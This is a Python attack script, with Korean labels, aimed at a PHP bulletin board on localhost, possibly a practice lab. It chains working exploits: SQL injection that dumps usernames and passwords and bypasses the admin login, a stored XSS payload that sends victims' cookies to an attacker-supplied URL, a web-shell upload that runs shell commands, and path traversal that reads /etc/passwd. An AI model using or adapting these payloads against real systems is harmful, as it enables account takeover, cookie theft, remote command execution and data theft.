import requests
import sys

file_path = sys.argv[1]
mysite = sys.argv[2]
file = open(file_path,'rb')
upload = {'file': file}

session = requests.session()
def Injection(main_url, sql_url, xss_url, fileupload_url, filedownload_url):
    print("SQL Injection 취약점")
    search = "' order by 4 -- "
    search_sql_url = main_url + f"?searchword={search}"
    result_sql = requests.get(search_sql_url)
    if "게시판" in result_sql.text:
        print("union")
    
    search_union = "' union select user_id, user_password, 3, 4 from users -- 1"
    search_sql_url_union = main_url + f"?searchword={search_union}"
    print(search_sql_url_union)
    result_sql_union = requests.get(search_sql_url_union)
    if "게시판" in result_sql_union.text:
        print(result_sql_union.text)

    data_login = {
        "userid": "admin'-- 1", 
        "password": "1"
    }
    result_login = session.post(sql_url, data=data_login)
    if "글 작성" in result_login.text :
        print("로그인 성공")
    else:
        print("로그인 실패")

    print("XSS 취약점")
    title = "xss_test"
    content = f'<script>document.location="{mysite}?c="+document.cookie</script>'
    data_xss = {
        "title" : f"{title}",
        "content" : f"{content}",
    }
    result_write = session.post(xss_url, data=data_xss)
    search_url = main_url + f"?searchword={title}"
    result_search = requests.get(search_url)
    if "xss_test" in  result_search.text:
        print("글 작성 성공")
    for i in range(1,100):
        view_url = f"http://localhost/view.php?id={i}"
        result_view = requests.get(view_url)
        if "xss_test" in result_view.text:
            print(result_view.text)
            break

    print("파일 업로드 취약점")
    data = {
        "title" : "fileupload_test",
        "content" : "test",
    }
    result_upload = session.post(xss_url, data=data, files=upload)
    prompt = "cmd=cd ..; ls -al"
    cmd_url = fileupload_url + f"{file_path}? + {prompt}"
    result_fileupload = requests.get(cmd_url)
    print(result_fileupload.text)
    
    print("파일 다운로드 취약점")
    filename = "?name=../../../../../../etc/passwd"
    download_url = filedownload_url + filename
    result_filedownload = requests.get(download_url)
    print(result_filedownload.text)
    
main_url = "http://localhost/index.php"
sql_url = "http://localhost/login_success.php"
xss_url = "http://localhost/write_success.php"
fileupload_url = "http://localhost/uploads/"
filedownload_url = "http://localhost/download.php"
Injection(main_url, sql_url, xss_url, fileupload_url, filedownload_url)

